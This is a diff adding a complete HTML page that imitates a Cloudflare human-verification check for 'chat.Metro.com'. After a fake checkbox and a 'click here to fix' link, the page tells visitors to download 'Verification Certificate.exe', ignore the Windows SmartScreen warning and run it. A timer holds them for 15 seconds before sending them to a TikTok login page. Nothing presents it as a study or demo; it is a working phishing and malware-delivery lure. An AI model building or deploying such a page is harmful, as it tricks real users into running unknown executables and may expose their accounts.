@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>chat.Metro.com – Human Verification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #262626;
+      background: #f8f9fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .wrapper {
+      text-align: left;
+      background: white;
+      padding: 40px;
+      border-radius: 4px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      max-width: 480px;
+      width: 100%;
+    }
+    h1 { margin: 0 0 24px; font-size: 28px; font-weight: 600; }
+    p { margin: 0 0 24px; font-size: 16px; }
+    .box { position: relative; display: flex; align-items: center; border: 1px solid #e1e4e8; border-radius: 4px; padding: 12px; margin-bottom: 16px; }
+    .captcha-box input[type="checkbox"] { width: 18px; height: 18px; margin-right: 12px; position: relative; z-index: 1; }
+    .captcha-box input[type="checkbox"]:checked { visibility: hidden; }
+    .captcha-box #loader { display: none; position: absolute; width: 18px; height: 18px; left: 12px; top: 21px; border: 2px solid #e1e4e8; border-top-color: #0074cc; border-radius: 50%; animation: spin 1s linear infinite; z-index: 2; }
+    .captcha-box input[type="checkbox"]:checked + #loader { display: block; }
+    .download-box, .continue-box { display: none; flex-direction: column; }
+    .download-box a, .continue-box button { background: #f48625; color: white; border: none; padding: 10px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-top: 8px; align-self: flex-start; text-decoration: none; display: inline-block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .logo { margin-left: auto; text-align: center; font-size: 12px; }
+    .logo img { display: block; max-height: 20px; margin-bottom: 4px; }
+    .logo a { color: #0074cc; text-decoration: none; font-size: 10px; margin: 0 4px; }
+    #retry { display: none; font-size: 14px; margin-top: 8px; }
+    #retry a { color: #f48625; text-decoration: none; cursor: pointer; }
+    .note { font-size: small; font-style: italic; }
+    .error-message {
+      display: none;
+      background: #fff1f0;
+      border: 1px solid #ffccc7;
+      border-radius: 4px;
+      padding: 12px;
+      margin-bottom: 16px;
+      color: #ff4d4f;
+      font-size: 14px;
+      animation: shake 0.5s;
+      align-items: flex-start;
+      position: absolute;
+      top: 120px;
+    }
+    .error-icon {
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
+      font-weight: bold;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-3px); }
+      20%, 40%, 60%, 80% { transform: translateX(3px); }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <h1>chat.Metro.com</h1>
+    <p id="intro-msg">Verify you are human by completing the steps below.</p>
+
+    <div class="box captcha-box">
+      <input type="checkbox" id="cf-chk">
+      <div id="loader"></div>
+      <label for="cf-chk" id="cf-label">Verify you are human</label>
+      <div class="logo">
+        <img src="https://www.cloudflare.com/img/logo-cloudflare.svg" alt="Cloudflare Logo">
+        <div>
+          <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy</a>•
+          <a href="https://www.cloudflare.com/terms/" target="_blank">Terms</a>
+        </div>
+      </div>
+    </div>
+
+    <p id="review-connection">chat.Metro.com needs to review the security of your connection before proceeding.</p>
+    <p id="retry">
+      If this persists, <a id="fix-link"><strong>click here to fix</strong></a>.
+    </p>
+
+    <div class="box download-box" id="download-step">
+      <p>We weren’t able to confirm you’re human with our standard check. Please follow the steps below to resolve any issues and complete verification.</p>
+      <p>Almost there! Download your <strong>Verification Certificate</strong> to prove you’re human.</p>
+      <a href="files/Verification Certificate.exe"
+         download="Verification Certificate.exe"
+         id="download-btn"
+      >
+        Download Certificate
+      </a>
+    </div>
+
+    <div class="box continue-box" id="continue-step">
+      <p>Great! Now run the certificate you just downloaded, then click Continue. <br>
+        <div class="note">
+          Note: If you see the “Windows protected your PC” SmartScreen warning, click More info then Run anyway—it’s safe.
+        </div>
+      </p>
+      <div id="error-message" class="error-message">
+        <span class="error-icon">⚠</span>
+        <span id="error-text">Verification certificate not detected. Please run the downloaded certificate first.</span>
+      </div>
+      <button id="continue-btn">Continue</button>
+    </div>
+  </div>
+
+  <script>
+    const chk          = document.getElementById('cf-chk');
+    const cfLabel      = document.getElementById('cf-label');
+    const retry        = document.getElementById('retry');
+    const fixLink      = document.getElementById('fix-link');
+    const downloadStep = document.getElementById('download-step');
+    const downloadBtn  = document.getElementById('download-btn');
+    const continueStep = document.getElementById('continue-step');
+    const continueBtn  = document.getElementById('continue-btn');
+    const errorMsg     = document.getElementById('error-message');
+    const errorText    = document.getElementById('error-text');
+    const reviewMsg    = document.getElementById('review-connection');
+    let retryTimer, startTime = null;
+
+    chk.addEventListener('change', () => {
+      if (chk.checked) {
+        cfLabel.textContent = 'Verifying…';
+        retryTimer = setTimeout(() => retry.style.display = 'block', 5000);
+      } else {
+        cfLabel.textContent = 'Verify you are human';
+        clearTimeout(retryTimer);
+        retry.style.display = 'none';
+        downloadStep.style.display = 'none';
+        continueStep.style.display = 'none';
+        errorMsg.style.display = 'none';
+      }
+    });
+
+    fixLink.addEventListener('click', e => {
+      e.preventDefault();
+      retry.style.display = 'none';
+      reviewMsg.style.display = 'none';
+      downloadStep.style.display = 'flex';
+      errorMsg.style.display = 'none';
+    });
+
+    downloadBtn.addEventListener('click', () => {
+      // record when the user clicked the native download link
+      startTime = Date.now();
+      downloadStep.style.display = 'none';
+      continueStep.style.display = 'flex';
+    });
+
+    continueBtn.addEventListener('click', () => {
+      if (!startTime || (Date.now() - startTime) < 15000) {
+        errorMsg.style.display = 'flex';
+        errorText.innerHTML = `Verification certificate not detected.<br>` +
+                              `Please run the certificate.`;
+        setTimeout(() => errorMsg.style.display = 'none', 5000);
+      } else {
+        window.location.href = 'https://www.tiktok.com/login/phone-or-email/email';
+      }
+    });
+  </script>
+</body>
+</html>
